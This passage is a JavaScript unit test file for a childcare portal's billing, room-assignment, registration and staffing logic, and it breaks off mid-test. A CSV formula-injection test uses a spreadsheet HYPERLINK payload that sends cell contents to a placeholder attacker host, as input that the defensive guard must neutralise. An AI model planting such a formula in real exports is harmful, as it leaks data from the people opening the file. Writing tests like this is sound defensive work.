// ============================================================
// BUSINESS LOGIC UNIT TESTS
// Tests for core portal logic: room assignment, discounts,
// registration window, billing (weekly rates, multi-child).
//
// Run: node js/tests/business-logic.test.js
// No npm dependencies — uses only Node.js built-ins.
// ============================================================

'use strict';

// Migrations are looked up by NAME, never by filename. A migration's version
// belongs to whichever tool applied it, so hard-coding it here made correcting
// a version — the fix for ledger drift — break a dozen unrelated assertions.
// See scripts/migration-file.js and supabase/migrations/README.md.
const { readMigration } = require('../../scripts/migration-file.js');

// ---- Minimal test runner ----

let _passed = 0, _failed = 0;
// A test whose body returns a promise is settled before the summary prints —
// see _pending and the tail of this file. Without this, an async body that
// REJECTED was counted as a pass, because the try/catch around a synchronous
// fn() call never sees a rejection that happens a microtask later.
const _pending = [];
function describe(label, fn) { console.log(`\n  ${label}`); fn(); }
function test(label, fn) {
    let result;
    try {
        result = fn();
    } catch (err) {
        _failed++;
        console.error(`    ✗ ${label}\n      ${err.message}`);
        return;
    }
    if (result && typeof result.then === 'function') {
        _pending.push(result.then(
            () => { _passed++; console.log(`    ✓ ${label}`); },
            (err) => { _failed++; console.error(`    ✗ ${label}\n      ${err && err.message}`); },
        ));
        return;
    }
    _passed++;
    console.log(`    ✓ ${label}`);
}
function expect(actual) {
    return {
        toBe: (expected) => {
            if (actual !== expected)
                throw new Error(`expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
        },
        toBeNull: () => {
            if (actual !== null)
                throw new Error(`expected null, got ${JSON.stringify(actual)}`);
        },
        toBeCloseTo: (expected, decimals = 2) => {
            const diff = Math.abs(actual - expected);
            if (diff >= Math.pow(10, -decimals) / 2)
                throw new Error(`expected ~${expected}, got ${actual}`);
        },
        toBeGreaterThan: (n) => {
            if (actual <= n) throw new Error(`expected > ${n}, got ${actual}`);
        },
        toBeLessThan: (n) => {
            if (actual >= n) throw new Error(`expected < ${n}, got ${actual}`);
        },
    };
}

// Date-only values in the application are local civil dates, not UTC instants.
// `new Date('YYYY-MM-DD')` is UTC by specification and becomes the previous day
// in America/Chicago, which made these tests depend on the machine timezone.
function localDate(isoDate) {
    return new Date(`${isoDate}T00:00:00`);
}

// ============================================================
// STUBS — mirror the real ROOMS config from supabase.js
// ============================================================
// `status` mirrors js/supabase.js — getRoomIdFromDob filters on status==='active',
// NOT on room id, so the fixture has to carry it or the room-assignment tests are
// exercising different logic than production.
const ROOMS = [
    { id: 'bear',   status: 'active',   ageMinMonths: 0,  ageMaxMonths: 12,  fullDayRate: 80,  halfDayRate: null, weeklyFullRate: null, weeklyHalfRate: null, fullDayOnly: true },
    { id: 'bee',    status: 'active',   ageMinMonths: 12, ageMaxMonths: 24,  fullDayRate: 75,  halfDayRate: 55,   weeklyFullRate: null, weeklyHalfRate: null, fullDayOnly: false },
    { id: 'turtle', status: 'active',   ageMinMonths: 24, ageMaxMonths: 30,  fullDayRate: 75,  halfDayRate: 45,   weeklyFullRate: null, weeklyHalfRate: null, fullDayOnly: false },
    { id: 'goose',  status: 'active',   ageMinMonths: 30, ageMaxMonths: 36,  fullDayRate: 75,  halfDayRate: 45,   weeklyFullRate: null, weeklyHalfRate: null, fullDayOnly: false },
    { id: 'owl',    status: 'active',   ageMinMonths: 36, ageMaxMonths: null, fullDayRate: 75, halfDayRate: 45,   weeklyFullRate: 300, weeklyHalfRate: 180,  fullDayOnly: false },
    { id: 'summer', status: 'seasonal', ageMinMonths: null, ageMaxMonths: null, fullDayRate: 75, halfDayRate: null, weeklyFullRate: null, weeklyHalfRate: null, hidden: false },
];

// ============================================================
// PURE FUNCTIONS (copied verbatim from app.js / supabase.js)
// These must remain in sync when the source changes.
// ============================================================

function calcAgeMonths(dobStr, referenceDate) {
    if (!dobStr) return null;
    const today = referenceDate || new Date();
    const birth = new Date(dobStr + 'T00:00:00');
    let months = (today.getFullYear() - birth.getFullYear()) * 12
               + (today.getMonth() - birth.getMonth());
    if (today.getDate() < birth.getDate()) months--;
    return months;
}

function roomIdForAgeMonths(months, roomList) {
    if (months == null || months < 0) return null;
    const ageable = (roomList || [])
        .filter(r => r.ageMinMonths != null)
        .sort((a, b) => a.ageMinMonths - b.ageMinMonths);
    for (const room of ageable) {
        if (months >= room.ageMinMonths && (room.ageMaxMonths == null || months < room.ageMaxMonths)) {
            return room.id;
        }
    }
    return null;
}

function getRoomIdFromDob(dobStr, referenceDate) {
    if (!dobStr) return null;
    const months = calcAgeMonths(dobStr, referenceDate);
    return roomIdForAgeMonths(months, ROOMS.filter(r => r.status === 'active'));
}

function effectiveRate(baseRate, discountType, discountValue) {
    if (!baseRate) return 0;
    if (discountType === 'staff') return 0;
    if (discountType === 'custom' && discountValue > 0)
        return Math.round(baseRate * (1 - discountValue / 100) * 100) / 100;
    return baseRate;
}

// centralHour simulates the current hour (0–23) in America/Chicago time.
// Defaults to 12 (noon) so existing tests that don't care about time still pass.
function getRegistrationWindow(today, override = 'auto', centralHour = 12) {
    const day   = today.getDate();
    const year  = today.getFullYear();
    const month = today.getMonth();

    const targetDate  = new Date(year, month + 1, 1);
    const deadlineDate = new Date(year, month, 15);

    const opensToday = (day === 1 && centralHour < 9);
    let mode;
    if (day > 15 || opensToday) {
        mode = 'closed';
    } else {
        mode = 'confirmed';
    }
    if (override === 'open')   mode = 'confirmed';
    if (override === 'closed') mode = 'closed';

    return {
        mode,
        opensToday,
        targetDate,
        targetLabel:  ['January','February','March','April','May','June',
                       'July','August','September','October','November','December'][targetDate.getMonth()]
                      + ' ' + targetDate.getFullYear(),
        deadlineLabel: deadlineDate.toLocaleDateString('en-US', { month: 'long', day: 'numeric' }),
    };
}

function getWeekMonday(dateStr) {
    const d   = new Date(dateStr + 'T00:00:00');
    const dow = d.getDay(); // 0=Sun … 6=Sat
    const toMon = dow === 0 ? -6 : 1 - dow;
    const mon = new Date(d);
    mon.setDate(d.getDate() + toMon);
    return mon.toISOString().slice(0, 10);
}

// Simplified calcTotal for testing (no global state — takes args instead)
function calcTotalForTest(selectedDatesMap, children) {
    if (!children.length) return 0;

    const byWeek = new Map();
    for (const [dateStr, entry] of selectedDatesMap) {
        const wk = getWeekMonday(dateStr);
        if (!byWeek.has(wk)) byWeek.set(wk, []);
        byWeek.get(wk).push({ dateStr, dayType: entry.dayType });
    }

    let total = 0;
    for (const [, days] of byWeek) {
        const isFullWeek = days.length === 5;
        const allFull    = isFullWeek && days.every(d => d.dayType === 'full');
        const allHalf    = isFullWeek && days.every(d => d.dayType === 'half');

        if (allFull || allHalf) {
            // Weekly rate per child
            for (const child of children) {
                const weeklyRate = allFull ? child.room.weeklyFullRate : child.room.weeklyHalfRate;
                if (weeklyRate) {
                    total += effectiveRate(weeklyRate, child.discountType, child.discountValue);
                } else {
                    // No weekly rate configured — sum individual days
                    const dailyRate = allFull ? child.room.fullDayRate : (child.room.halfDayRate || 0);
                    total += 5 * effectiveRate(dailyRate, child.discountType, child.discountValue);
                }
            }
        } else {
            for (const day of days) {
                const sorted = children.map(c => {
                    const base = day.dayType === 'half' ? (c.room.halfDayRate || 0) : (c.room.fullDayRate || 0);
                    return { child: c, eff: effectiveRate(base, c.discountType, c.discountValue) };
                }).sort((a, b) => b.eff - a.eff);

                sorted.forEach((entry, i) => {
                    total += Math.max(0, entry.eff - (i > 0 ? 10 : 0));
                });
            }
        }
    }
    return total;
}

function escHtml(str) {
    return String(str ?? '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

// ── ProCare import duplicate guard (copy of js/admin/admin-billing.js) ───────
// Guarded by the source-drift check below. Behavior, not shape, is what these
// two are tested for: a doubled payment inflates a family's childcare tax
// statement, and a dropped one understates it.
function _procareDupKey(p) {
    return [
        String(p.family_id),
        String(p.payment_date).slice(0, 10),
        Number(p.amount || 0).toFixed(2),
    ].join('|');
}

function _procareDupCounts(payments) {
    const counts = new Map();
    (payments || []).forEach(p => {
        const k = _procareDupKey(p);
        counts.set(k, (counts.get(k) || 0) + 1);
    });
    return counts;
}

function _buildArRows(month, families, invoices, monthPayments) {
    const invoiceByFamily = new Map(invoices.map(inv => [String(inv.family_id), inv]));

    const paymentsByFamily = {};
    monthPayments.forEach(p => {
        const fid = String(p.family_id);
        if (!paymentsByFamily[fid]) paymentsByFamily[fid] = [];
        paymentsByFamily[fid].push(p);
    });

    return families.map(family => {
        const inv      = invoiceByFamily.get(String(family.id));
        const payments = paymentsByFamily[String(family.id)] || [];

        const billed      = parseFloat(inv?.final_amount || 0);
        const collected   = payments.reduce((s, p) => s + parseFloat(p.amount || 0), 0);

        const billedIfSent = inv?.sent_at ? billed : 0;
        const outstanding  = Math.max(0, billedIfSent - collected);

        let status;
        if (billedIfSent === 0 && collected === 0) status = 'no_invoice';
        else if (outstanding <= 0 && billedIfSent > 0) status = 'paid';
        else if (collected > 0)                        status = 'partial';
        else                                            status = 'overdue';

        const daysSince = inv?.sent_at
            ? Math.max(0, Math.floor((Date.now() - new Date(inv.sent_at).getTime()) / 86400000))
            : null;

        return {
            familyId:    family.id,
            familyName:  family.parent_name || '(unnamed)',
            familyEmail: family.parent_email || '',
            invoiceId:   inv?.id || null,
            sentAt:      inv?.sent_at || null,
            daysSince,
            billed,
            collected,
            outstanding,
            status,
            payments,
            isLocked:    !!family.registration_locked,
            lockReason:  family.registration_lock_reason || '',
        };
    });
}

// ============================================================
// TESTS
// ============================================================

describe('calcAgeMonths', () => {
    const ref = localDate('2026-03-24');

    test('returns correct month count for a 6-month-old', () => {
        expect(calcAgeMonths('2025-09-24', ref)).toBe(6);
    });
    test('returns 0 for a child born today', () => {
        expect(calcAgeMonths('2026-03-24', ref)).toBe(0);
    });
    test('returns 36 for a 3-year-old', () => {
        expect(calcAgeMonths('2023-03-24', ref)).toBe(36);
    });
    test('returns null for empty string', () => {
        expect(calcAgeMonths('')).toBeNull();
    });
    test('handles month-boundary crossings (e.g., born Oct 31, ref Mar 1)', () => {
        const r = localDate('2026-03-01');
        // Oct→Nov→Dec→Jan→Feb→Mar = 5 calendar months, but the 1st is still
        // 30 days short of the 31st-of-the-month mark, so only 4 are complete.
        expect(calcAgeMonths('2025-10-31', r)).toBe(4);
    });
    test('does not round up early when the day-of-month has not been reached yet', () => {
        // Born Mar 28, 2025; as of Mar 24, 2026 they are 11 months old, not 12 —
        // their 12-month "birthday" is 4 days away. A year/month-only diff
        // (ignoring day-of-month) would wrongly report 12 here.
        expect(calcAgeMonths('2025-03-28', localDate('2026-03-24'))).toBe(11);
    });
});

describe('getRoomIdFromDob — age-based room assignment', () => {
    const ref = localDate('2026-03-24');
    // Helper: produce DOB that gives exactly N months of age on ref date
    const dobAtMonths = m => {
        const d = new Date(ref);
        d.setMonth(d.getMonth() - m);
        return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
    };

    test('newborn (0 months) → bear room', () => {
        expect(getRoomIdFromDob(dobAtMonths(0), ref)).toBe('bear');
    });
    test('11 months → bear room (upper boundary)', () => {
        expect(getRoomIdFromDob(dobAtMonths(11), ref)).toBe('bear');
    });
    test('12 months → bee room', () => {
        expect(getRoomIdFromDob(dobAtMonths(12), ref)).toBe('bee');
    });
    test('23 months → bee room (upper boundary)', () => {
        expect(getRoomIdFromDob(dobAtMonths(23), ref)).toBe('bee');
    });
    test('24 months → turtle room', () => {
        expect(getRoomIdFromDob(dobAtMonths(24), ref)).toBe('turtle');
    });
    test('29 months → turtle room (upper boundary)', () => {
        expect(getRoomIdFromDob(dobAtMonths(29), ref)).toBe('turtle');
    });
    test('30 months → goose room', () => {
        expect(getRoomIdFromDob(dobAtMonths(30), ref)).toBe('goose');
    });
    test('35 months → goose room (upper boundary)', () => {
        expect(getRoomIdFromDob(dobAtMonths(35), ref)).toBe('goose');
    });
    test('36 months → owl room', () => {
        expect(getRoomIdFromDob(dobAtMonths(36), ref)).toBe('owl');
    });
    test('60 months (5 yrs) → owl room (no upper bound)', () => {
        expect(getRoomIdFromDob(dobAtMonths(60), ref)).toBe('owl');
    });
    test('future DOB (negative age) → null', () => {
        expect(getRoomIdFromDob('2030-01-01', ref)).toBeNull();
    });
    test('a few days shy of the 12-month mark stays in bear, not bee', () => {
        // Turns 12 months on Mar 28, 2026 — still bear as of Mar 24.
        expect(getRoomIdFromDob('2025-03-28', ref)).toBe('bear');
    });
    test('null/empty DOB → null', () => {
        expect(getRoomIdFromDob(null)).toBeNull();
        expect(getRoomIdFromDob('')).toBeNull();
    });
});

describe('effectiveRate — discount calculation', () => {
    test('no discount returns base rate unchanged', () => {
        expect(effectiveRate(75, 'none', 0)).toBe(75);
    });
    test('staff discount → 0', () => {
        expect(effectiveRate(75, 'staff', 0)).toBe(0);
    });
    test('custom 20% off $75 → $60', () => {
        expect(effectiveRate(75, 'custom', 20)).toBe(60);
    });
    test('custom 10% off $55 → $49.50', () => {
        expect(effectiveRate(55, 'custom', 10)).toBeCloseTo(49.5);
    });
    test('custom 0% → base rate unchanged', () => {
        expect(effectiveRate(75, 'custom', 0)).toBe(75);
    });
    test('zero base rate → 0 regardless of discount type', () => {
        expect(effectiveRate(0, 'none', 0)).toBe(0);
        expect(effectiveRate(0, 'custom', 50)).toBe(0);
    });
    test('result is rounded to 2 decimal places', () => {
        // 75 * (1 - 33/100) = 75 * 0.67 = 50.25
        expect(effectiveRate(75, 'custom', 33)).toBe(50.25);
    });
});

describe('getRegistrationWindow — registration open/close logic', () => {
    test('day 1 at 9 AM → open (mode: confirmed)', () => {
        expect(getRegistrationWindow(localDate('2026-03-01'), 'auto', 9).mode).toBe('confirmed');
    });
    test('day 1 at 8:59 AM → closed (before 9 AM)', () => {
        expect(getRegistrationWindow(localDate('2026-03-01'), 'auto', 8).mode).toBe('closed');
    });
    test('day 1 at midnight → closed (before 9 AM)', () => {
        expect(getRegistrationWindow(localDate('2026-03-01'), 'auto', 0).mode).toBe('closed');
    });
    test('day 15 → open (boundary)', () => {
        expect(getRegistrationWindow(localDate('2026-03-15')).mode).toBe('confirmed');
    });
    test('day 16 → closed', () => {
        expect(getRegistrationWindow(localDate('2026-03-16')).mode).toBe('closed');
    });
    test('day 31 → closed', () => {
        expect(getRegistrationWindow(localDate('2026-01-31')).mode).toBe('closed');
    });
    test('override "open" forces mode to confirmed even after day 15', () => {
        expect(getRegistrationWindow(localDate('2026-03-20'), 'open').mode).toBe('confirmed');
    });
    test('override "open" forces mode to confirmed even before 9 AM on the 1st', () => {
        expect(getRegistrationWindow(localDate('2026-03-01'), 'open', 7).mode).toBe('confirmed');
    });
    test('override "closed" forces mode to closed even on day 1 at 9 AM', () => {
        expect(getRegistrationWindow(localDate('2026-03-01'), 'closed', 9).mode).toBe('closed');
    });
    test('target month is always next calendar month', () => {
        const win = getRegistrationWindow(localDate('2026-03-10'));
        expect(win.targetDate.getMonth()).toBe(3);  // April (0-indexed)
        expect(win.targetDate.getFullYear()).toBe(2026);
    });
    test('target month wraps to January next year in December', () => {
        const win = getRegistrationWindow(localDate('2026-12-10'));
        expect(win.targetDate.getMonth()).toBe(0);  // January
        expect(win.targetDate.getFullYear()).toBe(2027);
    });
});

describe('getWeekMonday — ISO Monday of a week', () => {
    test('Wednesday → Monday of same week', () => {
        expect(getWeekMonday('2026-03-25')).toBe('2026-03-23'); // Wed → Mon
    });
    test('Monday → itself', () => {
        expect(getWeekMonday('2026-03-23')).toBe('2026-03-23');
    });
    test('Sunday → previous Monday', () => {
        expect(getWeekMonday('2026-03-22')).toBe('2026-03-16');
    });
    test('Friday → Monday of same week', () => {
        expect(getWeekMonday('2026-03-27')).toBe('2026-03-23');
    });
    test('crosses month boundary correctly', () => {
        expect(getWeekMonday('2026-04-01')).toBe('2026-03-30'); // Wed Apr 1 → Mon Mar 30
    });
});

describe('calcTotalForTest — billing totals', () => {
    const owlRoom = ROOMS.find(r => r.id === 'owl');   // has weeklyFullRate: 300
    const beeRoom = ROOMS.find(r => r.id === 'bee');   // no weekly rate

    const noDisc = { discountType: 'none', discountValue: 0 };
    const child1 = { room: owlRoom, ...noDisc };

    test('single child, single full day → full day rate', () => {
        const dates = new Map([['2026-03-23', { dayType: 'full' }]]);
        expect(calcTotalForTest(dates, [child1])).toBe(75);
    });
    test('single child, single half day → half day rate', () => {
        const dates = new Map([['2026-03-23', { dayType: 'half' }]]);
        expect(calcTotalForTest(dates, [child1])).toBe(45);
    });
    test('full week Mon–Fri, owl room (weeklyFullRate=300) → 300', () => {
        const dates = new Map([
            ['2026-03-23', { dayType: 'full' }],
            ['2026-03-24', { dayType: 'full' }],
            ['2026-03-25', { dayType: 'full' }],
            ['2026-03-26', { dayType: 'full' }],
            ['2026-03-27', { dayType: 'full' }],
        ]);
        expect(calcTotalForTest(dates, [child1])).toBe(300);
    });
    test('4 days (not a full week) → 4 × daily rate', () => {
        const dates = new Map([
            ['2026-03-23', { dayType: 'full' }],
            ['2026-03-24', { dayType: 'full' }],
            ['2026-03-25', { dayType: 'full' }],
            ['2026-03-26', { dayType: 'full' }],
        ]);
        expect(calcTotalForTest(dates, [child1])).toBe(4 * 75);
    });
    test('full week, bee room (no weekly rate) → 5 × daily rate', () => {
        const beeChild = { room: beeRoom, ...noDisc };
        const dates = new Map([
            ['2026-03-23', { dayType: 'full' }],
            ['2026-03-24', { dayType: 'full' }],
            ['2026-03-25', { dayType: 'full' }],
            ['2026-03-26', { dayType: 'full' }],
            ['2026-03-27', { dayType: 'full' }],
        ]);
        expect(calcTotalForTest(dates, [beeChild])).toBe(5 * 75);
    });
    test('two children, 1 day: second child gets $10 multi-child discount', () => {
        const child2 = { room: owlRoom, ...noDisc };
        const dates = new Map([['2026-03-23', { dayType: 'full' }]]);
        // child1: $75, child2: $75 - $10 = $65 → total $140
        expect(calcTotalForTest(dates, [child1, child2])).toBe(140);
    });
    test('staff discount child → $0 regardless of day type', () => {
        const staffChild = { room: owlRoom, discountType: 'staff', discountValue: 0 };
        const dates = new Map([['2026-03-23', { dayType: 'full' }]]);
        expect(calcTotalForTest(dates, [staffChild])).toBe(0);
    });
    test('custom 20% discount applied to daily rate', () => {
        const discChild = { room: owlRoom, discountType: 'custom', discountValue: 20 };
        // $75 * 0.80 = $60
        const dates = new Map([['2026-03-23', { dayType: 'full' }]]);
        expect(calcTotalForTest(dates, [discChild])).toBe(60);
    });
    test('empty dates → 0', () => {
        expect(calcTotalForTest(new Map(), [child1])).toBe(0);
    });
    test('no children → 0', () => {
        const dates = new Map([['2026-03-23', { dayType: 'full' }]]);
        expect(calcTotalForTest(dates, [])).toBe(0);
    });
});

describe('_buildArRows — an unsent draft is not money a family owes', () => {
    // reconcileBillingInvoice() drafts a billing_invoices row for every clean
    // family the moment Bill the Month computes them, well before Release/Send
    // is clicked — found live 2026-08-28: 94 of August's 95 drafted invoices
    // had never been sent, and their combined final_amount was the entire
    // Ledger "owed" banner and "Nudge all" count.
    const family = { id: 'fam-1', parent_name: 'Test Family', parent_email: 't@example.com' };

    test('a drafted-but-unsent invoice is not outstanding, owed, or overdue', () => {
        const invoices = [{ family_id: 'fam-1', final_amount: 360, sent_at: null }];
        const [row] = _buildArRows('2026-08', [family], invoices, []);
        expect(row.billed).toBe(360);        // the draft amount is still visible for display purposes
        expect(row.outstanding).toBe(0);     // but nothing is actually owed yet
        expect(row.status).toBe('no_invoice');
    });

    test('once sent, the same amount becomes real outstanding balance', () => {
        const invoices = [{ family_id: 'fam-1', final_amount: 360, sent_at: '2026-08-28T12:00:00Z' }];
        const [row] = _buildArRows('2026-08', [family], invoices, []);
        expect(row.billed).toBe(360);
        expect(row.outstanding).toBe(360);
        expect(row.status).toBe('overdue');
    });

    test('a sent invoice fully paid reads as paid, not owed', () => {
        const invoices = [{ family_id: 'fam-1', final_amount: 360, sent_at: '2026-08-28T12:00:00Z' }];
        const payments = [{ family_id: 'fam-1', amount: 360 }];
        const [row] = _buildArRows('2026-08', [family], invoices, payments);
        expect(row.outstanding).toBe(0);
        expect(row.status).toBe('paid');
    });

    test('a payment against an unsent draft cannot go negative', () => {
        const invoices = [{ family_id: 'fam-1', final_amount: 360, sent_at: null }];
        const payments = [{ family_id: 'fam-1', amount: 50 }];
        const [row] = _buildArRows('2026-08', [family], invoices, payments);
        expect(row.outstanding).toBe(0);
    });
});

describe('escHtml — XSS sanitization', () => {
    test('escapes < and >', () => {
        expect(escHtml('<script>')).toBe('&lt;script&gt;');
    });
    test('escapes &', () => {
        expect(escHtml('A & B')).toBe('A &amp; B');
    });
    test('escapes double quotes', () => {
        expect(escHtml('"quoted"')).toBe('&quot;quoted&quot;');
    });
    test('escapes single quotes', () => {
        expect(escHtml("it's")).toBe('it&#39;s');
    });
    test('plain text unchanged', () => {
        expect(escHtml('Alice Smith')).toBe('Alice Smith');
    });
    test('null/undefined → empty string', () => {
        expect(escHtml(null)).toBe('');
        expect(escHtml(undefined)).toBe('');
    });
    test('number converted to string', () => {
        expect(escHtml(42)).toBe('42');
    });
});

// ---- csvCell (copy of js/admin/admin-core.js) ----
function csvCell(val) {
    let str = String(val ?? '');
    if (/^[=+\-@\t\r]/.test(str)) str = `'${str}`;
    return str.includes(',') || str.includes('"') || str.includes('\n')
        ? `"${str.replace(/"/g, '""')}"` : str;
}

describe('csvCell — RFC 4180 quoting + formula-injection guard', () => {
    test('plain text passes through', () => {
        expect(csvCell('Alice Smith')).toBe('Alice Smith');
    });
    test('comma forces quoting', () => {
        expect(csvCell('Smith, Alice')).toBe('"Smith, Alice"');
    });
    test('embedded quote is doubled', () => {
        expect(csvCell('the "Bear" room')).toBe('"the ""Bear"" room"');
    });
    test('newline forces quoting', () => {
        expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
    });
    test('null/undefined → empty string', () => {
        expect(csvCell(null)).toBe('');
        expect(csvCell(undefined)).toBe('');
    });
    test('number is stringified', () => {
        expect(csvCell(42)).toBe('42');
    });

    // R17 — a parent-supplied name starting with =, +, - or @ executes when the
    // export is opened in Excel/Sheets. The apostrophe forces text, and is not
    // displayed by the spreadsheet.
    test('leading = is neutralised', () => {
        expect(csvCell('=HYPERLINK("http://evil.tld?"&A1)'))
            .toBe('"\'=HYPERLINK(""http://evil.tld?""&A1)"');
    });
    test('leading + is neutralised', () => {
        expect(csvCell('+1234')).toBe("'+1234");
    });
    test('leading - is neutralised', () => {
        expect(csvCell('-1+1')).toBe("'-1+1");
    });
    test('leading @ is neutralised', () => {
        expect(csvCell('@SUM(A1:A9)')).toBe("'@SUM(A1:A9)");
    });
    test('a hyphen mid-string is left alone', () => {
        expect(csvCell('Mary-Jane')).toBe('Mary-Jane');
    });
    test('phone number keeps its leading plus escaped, still one field', () => {
        expect(csvCell('+1 (314) 555-0100')).toBe("'+1 (314) 555-0100");
    });
});

// ============================================================
// SOURCE-DRIFT GUARD
// ------------------------------------------------------------
// The functions above are copies of production code, because js/*.js are plain
// browser globals with top-level side effects and cannot be require()d from
// Node. That makes every test above vacuous on its own: change effectiveRate()
// in js/app.js and all of these still pass.
//
// This guard closes that gap. It reads the real source, extracts the named
// function by brace-matching, normalizes whitespace/comments, and compares it to
// the copy in this file. If production changes and the copy is not re-synced,
// the suite goes red and names the function.
//
// It is not a substitute for importing the real code — the proper fix is to
// extract these pure functions into a side-effect-free module both the browser
// and Node can load — but it does mean divergence can no longer happen silently.
// (It caught a real one: getRoomIdFromDob had already been refactored in
// supabase.js to filter on status==='active' while this file still filtered on
// id !== 'summer'.)
// ============================================================
const fs   = require('fs');
const path = require('path');

function extractFunction(sourceText, name) {
    const start = sourceText.search(new RegExp(`^function\\s+${name}\\s*\\(`, 'm'));
    if (start === -1) return null;
    const open = sourceText.indexOf('{', start);
    let depth = 0, i = open;
    for (; i < sourceText.length; i++) {
        const c = sourceText[i];
        if (c === '{') depth++;
        else if (c === '}') { depth--; if (depth === 0) { i++; break; } }
    }
    return sourceText.slice(start, i);
}

// Strip comments and collapse whitespace so formatting-only edits don't trip it.
function normalize(fnText) {
    return fnText
        .replace(/\/\*[\s\S]*?\*\//g, '')
        .replace(/\/\/[^\n]*/g, '')
        .replace(/\s+/g, ' ')
        .trim();
}

// ── Ratio-step / next-child calculator (copied from js/admin/admin-reports.js) ──
// The day is two shifts: AM holds every child booked, PM holds only the
// full-day children (a half-day booking is a morning session). Staffing steps
// per shift, so the child who trips a shift pays for that shift's teacher.
const SHIFT_HRS = { am: 5, pm: 5 };
let allRegistrations = [];

function _ratioStepWage(staff, roomId) {
    const hourly = staff.filter(s => s.pay_type === 'hourly' && Number(s.hourly_rate) > 0);
    const inRoom = hourly.filter(s => s.room_id === roomId);
    const pool   = inRoom.length ? inRoom : hourly;
    if (!pool.length) return 0;
    return pool.reduce((sum, s) => sum + Number(s.hourly_rate), 0) / pool.length;
}

function _ratioStaffNeed(children, ratio) {
    if (!ratio || ratio <= 0) return null;
    return Math.ceil(children / ratio);
}

function _ratioStepOffer(opts) {
    const { isFullDay, rate, ratio, wage, openSeats, headroomAm, headroomPm, amChildren } = opts;
    const none = { stepsAm: false, stepsPm: false, cost: null, margin: null };

    if (!rate || rate <= 0)                        return Object.assign({ verdict: 'not-offered' }, none);
    if (openSeats !== null && openSeats <= 0)      return Object.assign({ verdict: 'full' }, none);
    if (!ratio || ratio <= 0)                      return Object.assign({ verdict: 'no-ratio' }, none);

    // The morning must absorb every booking; only a full day also has to fit
    // the afternoon.
    const stepsAm = headroomAm === 0;
    const stepsPm = isFullDay && headroomPm === 0;

    if (!stepsAm && !stepsPm) {
        return { verdict: 'free', stepsAm, stepsPm, cost: 0, margin: rate };
    }
    // A room with nobody booked needs its first teacher for this child.
    const verdict = amChildren === 0 ? 'opens' : 'step';
    if (!wage || wage <= 0) {
        return { verdict, stepsAm, stepsPm, cost: null, margin: null };
    }
    const cost = (stepsAm ? SHIFT_HRS.am : 0) * wage + (stepsPm ? SHIFT_HRS.pm : 0) * wage;
    return { verdict, stepsAm, stepsPm, cost, margin: rate - cost };
}

function _buildRatioStepRows(weekDates, rooms, staff) {
    const counts = {};                       // date → roomId → { total, half }
    weekDates.forEach(d => { counts[d] = {}; });

    allRegistrations.forEach(reg => {
        if (reg.status !== 'confirmed') return;
        (reg.registration_dates || []).forEach(rd => {
            if (rd.waitlisted || !counts[rd.care_date]) return;
            const roomId = rd.room_id || reg.room_id;
            if (!roomId) return;
            const c = counts[rd.care_date][roomId] ||
                      (counts[rd.care_date][roomId] = { total: 0, half: 0 });
            c.total++;
            if (rd.day_type === 'half') c.half++;
        });
    });

    const wageByRoom = {};
    rooms.forEach(r => { wageByRoom[r.id] = _ratioStepWage(staff, r.id); });

    const rows = [];
    weekDates.forEach(date => {
        rooms.forEach(room => {
            const c        = counts[date][room.id] || { total: 0, half: 0 };
            const ratio    = room.staffRatio || 0;
            const capacity = room.capacity   || 0;
            const wage     = wageByRoom[room.id] || 0;
            const fullRate = room.fullDayRate || 0;
            // A full-day-only room has no half-day booking to price.
            const halfRate = room.fullDayOnly ? 0 : (room.halfDayRate || 0);

            // Morning holds everyone; the afternoon holds only full-day children.
            const amChildren = c.total;
            const pmChildren = c.total - c.half;

            // ceil() is the step. With 0 children 0 teachers are required, so
            // the first child of a shift genuinely does cost a teacher — that
            // is a real step, not an edge case to paper over.
            const staffAm    = _ratioStaffNeed(amChildren, ratio);
            const staffPm    = _ratioStaffNeed(pmChildren, ratio);
            const headroomAm = ratio > 0 ? staffAm * ratio - amChildren : null;
            const headroomPm = ratio > 0 ? staffPm * ratio - pmChildren : null;
            const openSeats  = capacity > 0 ? capacity - amChildren : null;

            // Teachers the afternoon does not need — they can leave at midday
            // once the half-day children go home.
            const releasable      = (staffAm === null || staffPm === null) ? null : staffAm - staffPm;
            const releasableHours = releasable === null ? null : releasable * SHIFT_HRS.pm;

            const shared = { ratio, wage, openSeats, headroomAm, headroomPm, amChildren };
            const fullDay = _ratioStepOffer(Object.assign({ isFullDay: true,  rate: fullRate }, shared));
            const halfDay = _ratioStepOffer(Object.assign({ isFullDay: false, rate: halfRate }, shared));

            rows.push({
                date, roomId: room.id, roomLabel: room.label,
                children: c.total, half: c.half, amChildren, pmChildren,
                ratio, capacity, openSeats,
                staffAm, staffPm, headroomAm, headroomPm,
                releasable, releasableHours,
                fullRate, halfRate, wage,
                fullDay, halfDay,
            });
        });
    });
    return rows;
}

// Test helpers
function _rsRoom(over = {}) {
    return Object.assign({ id: 'a', label: 'A', staffRatio: 4, capacity: 20,
                           fullDayRate: 75, halfDayRate: 45, fullDayOnly: false }, over);
}
function _rsRun(rooms, staff, bookings, dates = ['2026-08-11']) {
    allRegistrations = bookings.map(b => ({
        status: b.status || 'confirmed',
        room_id: b.room || 'a',
        registration_dates: [{
            care_date: b.date || '2026-08-11',
            room_id: b.room || 'a',
            day_type: b.t || 'full',
            waitlisted: !!b.wl,
        }],
    }));
    return _buildRatioStepRows(dates, rooms, staff);
}
const _RS_WAGE = [{ pay_type: 'hourly', hourly_rate: 20, room_id: null }];
// n children: `half` of them half-day (morning only), the rest full-day.
const _rsFill = (n, half = 0, room = 'a') =>
    Array.from({ length: n }, (_, i) => ({ room, t: i < half ? 'half' : 'full' }));

describe('_ratioStepWage — pricing one more teacher-shift', () => {
    test('averages the hourly staff assigned to the room', () => {
        expect(_ratioStepWage([
            { pay_type: 'hourly', hourly_rate: 16, room_id: 'a' },
            { pay_type: 'hourly', hourly_rate: 20, room_id: 'a' },
        ], 'a')).toBe(18);
    });
    test('falls back to the center-wide average when the room has nobody', () => {
        expect(_ratioStepWage([
            { pay_type: 'hourly', hourly_rate: 10, room_id: 'b' },
            { pay_type: 'hourly', hourly_rate: 30, room_id: 'c' },
        ], 'a')).toBe(20);
    });
    test('room-assigned staff take precedence over the center average', () => {
        expect(_ratioStepWage([
